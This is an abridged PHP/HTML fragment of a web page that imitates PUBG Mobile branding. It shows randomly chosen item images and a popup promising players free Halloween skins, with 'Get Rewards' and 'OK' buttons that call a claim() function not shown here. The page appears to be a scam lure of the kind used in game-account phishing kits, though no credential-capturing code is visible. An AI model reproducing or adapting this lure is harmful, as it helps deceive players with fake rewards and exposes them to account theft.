...
$array_img_result2 = $array_img[rand(0, (count($array_img)-1))];
$array_img_result3 = $array_img[rand(0, (count($array_img)-1))];
$array_img_result4 = $array_img[rand(0, (count($array_img)-1))];
?>
<html>
<head>
<meta charset="utf-8">
...
<link rel="icon" type="img/png" href="./img/tum.png" sizes="32x32">
    <meta property="og:description" content="beautify your game character, and become a pro player">
    <meta property="og:image" content="./img/tum.jpg">
   ...
   @font-face {
     ...
     src: url('css/pubg.ttf') format("truetype");
       ...
       .alert {
           ...
           top:50%;
           left:50%;
           background:url('https://i.ibb.co/ssv8Ldd/container-Home.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:150px;
...
<video style="width: 100%;" src="img/pubg.mp4" autoplay="" loop="" muted=""></video>
   <audio src="media/master.mp3" autoplay="" loop=""></audio>
            <div class="label" style="border-right: 2px solid #c6b98a;
           border-left: 2px solid #c6b98a;">
                <span>Royale Pass M11: EVANGELION </span>
    ...
    <div class="mask" style="display: none;"></div>
        <div class="alert" style="display: none;">
            <div class="top">METRO ROYALE</div>
            <p>Hello Players, Now You Have Chance To Get All Halloween Skin In PUBG Mobile, So Get It Now Hurry<br>
            <i class="fa fa-gift" aria-hidden="true"></i></p>
            <div class="btn" onclick="hide()" onmousedown="buka.play();">Get Rewards</div>
        </div>
     ...
     <div class="alertx">
        ...
        <div class="alertx4">
            <p class="px">
            <img id="gambar1" src="<?php echo ''.$array_img_result.''; ?>">
<img id="gambar2" src="<?php echo ''.$array_img_result2.''; ?>">
<img id="gambar3" src="<?php echo ''.$array_img_result3.''; ?>">
<img id="gambar4" src="<?php echo ''.$array_img_result4.''; ?>">
            </p>
            <div class="btnxcancel" onclick="location.href='';" onmousedown="tutup.play();"><img src="img/cancel.png" width="89px" height="32px"></div>
            <div class="btnxok" onclick="claim()"><img src="img/ok.png" width="89px" height="32px" onmousedown="buka.play();"></div>
        </div>
